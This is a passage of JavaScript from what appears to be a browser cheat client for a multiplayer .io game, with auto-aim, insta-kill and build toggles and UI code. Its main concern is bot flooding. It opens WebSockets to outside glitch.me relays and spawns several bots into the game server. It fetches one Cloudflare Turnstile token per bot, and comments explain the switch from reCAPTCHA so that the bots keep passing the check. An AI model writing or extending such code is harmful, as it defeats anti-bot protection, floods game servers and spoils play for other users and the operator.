    prepareMenuBackground();
    doUpdate();

    function toggleUseless(boolean) {
        getEl("instaType").disabled = boolean;
        getEl("antiBullType").disabled = boolean;
        getEl("predictType").disabled = boolean;
    }
    toggleUseless(useWasd);

    let changeDays = {};
    window.debug = function() {
        my.waitHit = 0;
        my.autoAim = false;
        instaC.isTrue = false;
        traps.inTrap = false;
        itemSprites = [];
        objSprites = [];
        gameObjectSprites = [];
    };
    window.wasdMode = function() {
        useWasd = !useWasd;
        toggleUseless(useWasd);
    };
    window.startGrind = function() {
        if (getEl("weaponGrind").checked) {
            for (let i = 0; i < Math.PI * 2; i += Math.PI / 2) {
                checkPlace(player.getItemType(22), i);
            }
        }
    };
    // REMOVED!!! so they cant abuse :)
    let projects = [
        "adorable-eight-guppy",
        "galvanized-bittersweet-windshield"
    ];
    let botIDS = 0;
    window.connectFillBots = function() {
        botSkts = [];
        botIDS = 0;
        for (let i = 0; i < projects.length; i++) {
            let test = new WebSocket(`wss://${projects[i]}.glitch.me`);
            test.binaryType = "arraybuffer";

            test.onopen = function() {
                test.ssend = function(type) {
                    let data = Array.prototype.slice.call(arguments, 1);
                    let binary = window.msgpack.encode([type, data]);
                    test.send(binary);
                };
                for (let i = 0; i < 4; i++) {
                    // reCAPTCHA is gone -- the game verifies Turnstile now, and
                    // freshToken() hands back a string that already carries the
                    // "cf:" prefix. Tokens are single-use, so ask per bot.
                    EXP.freshToken().then(function(token) {
                        if (!token) return console.warn("[Peter] no Turnstile token available");
                        let t = WS.url.split("wss://")[1].split("?")[0];
                        test.ssend("bots", "wss://" + t + "?token=" + encodeURIComponent(token), botIDS);
                        botSkts.push([test]);
                        botIDS++;
                    });
                }
            };
            test.onmessage = function(message) {
                let data = new Uint8Array(message.data);
                let parsed = window.msgpack.decode(data);
                let type = parsed[0];
                data = parsed[1];
            };
        }
    };
    window.destroyFillBots = function() {
        botSkts.forEach((socket) => {
            socket[0].close();
        });
        botSkts = [];
    };
    window.tryConnectBots = function() {
        for (let i = 0; i < (bots.length < 3 ? 3 : 4); i++) {
            // Same swap: Turnstile instead of reCAPTCHA, one token per bot.
            EXP.freshToken().then(function(token) {
                if (!token) return console.warn("[Peter] no Turnstile token available; cannot connect bot");
                // CONNECT SOCKET:
                botSpawn(token);
            });
        }
    };
    window.destroyBots = function() {
        bots.forEach((botyyyyy) => {
            botyyyyy.closeSocket = true;
        });
        bots = [];
    };
    window.resBuild = function() {
        if (gameObjects.length) {
            gameObjects.forEach((tmp) => {
                tmp.breakObj = false;
            });
            breakObjects = [];
        }
    };
    window.toggleBotsCircle = function() {
        player.circle = !player.circle;
    };
    window.toggleVisual = function() {
        config.anotherVisual = !config.anotherVisual;
        gameObjects.forEach((tmp) => {
            if (tmp.active) {
                tmp.dir = tmp.lastDir;
            }
        });
    };
    window.prepareUI = function(tmpObj) {
        resize();
        // CHAT STUFF:
        var chatBox = document.getElementById("chatBox");
        var chatHolder = document.getElementById("chatHolder");
        var suggestBox = document.createElement("div");
        suggestBox.id = "suggestBox";

        var prevChats = [];
        var prevChatsIndex = 0;

        function toggleChat() {
            if (!usingTouch) {
                if (chatHolder.style.display == "block") {
                    if (chatBox.value) {
                        sendChat(chatBox.value);
                    }
                    closeChat();
                } else {
                    storeMenu.style.display = "none";
                    allianceMenu.style.display = "none";
                    chatHolder.style.display = "block";
                    chatBox.focus();
                    resetMoveDir();
                }
            } else {
                setTimeout(function () {
                    var chatMessage = prompt("chat message");
                    if (chatMessage) {
                        sendChat(chatMessage);
                    }
                }, 1);
            }
            chatBox.value = "";
            (() => {
                prevChatsIndex = 0;
            })();
        }

        function closeChat() {
            chatBox.value = "";
            chatHolder.style.display = "none";
        }

        // ACTION BAR:
        UTILS.removeAllChildren(actionBar);

        for (let i = 0; i < (items.weapons.length + items.list.length); ++i) {
            (function (i) {
                UTILS.generateElement({
                    id: "actionBarItem" + i,
                    class: "actionBarItem",
                    style: "display:none; box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.5)",
                    onmouseout: function () {
                        showItemInfo();
                    },
                    parent: actionBar
                });
            })(i);
        }

        for (let i = 0; i < (items.list.length + items.weapons.length); ++i) {
            (function (i) {
                let tmpCanvas = document.createElement("canvas");
                tmpCanvas.width = tmpCanvas.height = 66;
                let tmpContext = tmpCanvas.getContext("2d");
                tmpContext.translate((tmpCanvas.width / 2), (tmpCanvas.height / 2));
                tmpContext.imageSmoothingEnabled = false;
                tmpContext.webkitImageSmoothingEnabled = false;
                tmpContext.mozImageSmoothingEnabled = false;

                if (items.weapons[i]) {
                    tmpContext.rotate((Math.PI));
                    let tmpSprite = new Image();
                    toolSprites[items.weapons[i].src] = tmpSprite;
                    tmpSprite.onload = function () {
                        this.isLoaded = true;
                        let tmpPad = 1 / (this.height / this.width);
                        let tmpMlt = (items.weapons[i].iPad || 1);
                        tmpContext.drawImage(this, -(tmpCanvas.width * tmpMlt * config.iconPad * tmpPad) / 2, -(tmpCanvas.height * tmpMlt * config.iconPad) / 2,
                                             tmpCanvas.width * tmpMlt * tmpPad * config.iconPad, tmpCanvas.height * tmpMlt * config.iconPad);
                        tmpContext.fillStyle = "rgba(0, 0, 70, 0.2)";
                        tmpContext.globalCompositeOperation = "source-atop";
                        tmpContext.fillRect(-tmpCanvas.width / 2, -tmpCanvas.height / 2, tmpCanvas.width, tmpCanvas.height);
                        getEl('actionBarItem' + i).style.backgroundImage = "url(" + tmpCanvas.toDataURL() + ")";
                    };
                    tmpSprite.src = "./../img/weapons/" + items.weapons[i].src + ".png";
                    let tmpUnit = getEl('actionBarItem' + i);
                    // tmpUnit.onmouseover = UTILS.checkTrusted(function () {
                    //     showItemInfo(items.weapons[i], true);
                    // });
                    tmpUnit.onclick = UTILS.checkTrusted(function () {
                        selectWeapon(tmpObj.weapons[items.weapons[i].type]);
                    });
                    UTILS.hookTouchEvents(tmpUnit);
                } else {
                    let tmpSprite = getItemSprite(items.list[i - items.weapons.length], true);
                    let tmpScale = Math.min(tmpCanvas.width - config.iconPadding, tmpSprite.width);
                    tmpContext.globalAlpha = 1;
                    tmpContext.drawImage(tmpSprite, -tmpScale / 2, -tmpScale / 2, tmpScale, tmpScale);
                    tmpContext.fillStyle = "rgba(0, 0, 70, 0.1)";
                    tmpContext.globalCompositeOperation = "source-atop";
                    tmpContext.fillRect(-tmpScale / 2, -tmpScale / 2, tmpScale, tmpScale);
                    getEl('actionBarItem' + i).style.backgroundImage = "url(" + tmpCanvas.toDataURL() + ")";
                    let tmpUnit = getEl('actionBarItem' + i);
                    // tmpUnit.onmouseover = UTILS.checkTrusted(function () {
                    //     showItemInfo(items.list[i - items.weapons.length]);
                    // });
                    tmpUnit.onclick = UTILS.checkTrusted(function () {
                        selectToBuild(tmpObj.items[tmpObj.getItemType(i - items.weapons.length)]);
                    });
                    UTILS.hookTouchEvents(tmpUnit);
                }
            })(i);
        }
    };
    window.profineTest = function(data) {
        if (data) {
            // VALIDATE NAME:
            let name = data + "";
            name = name.slice(0, config.maxNameLength);

            return name;
        }
    }
}(1)

} // end __peterBoot

if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", __peterBoot, { once: true });
} else {
    __peterBoot();
}
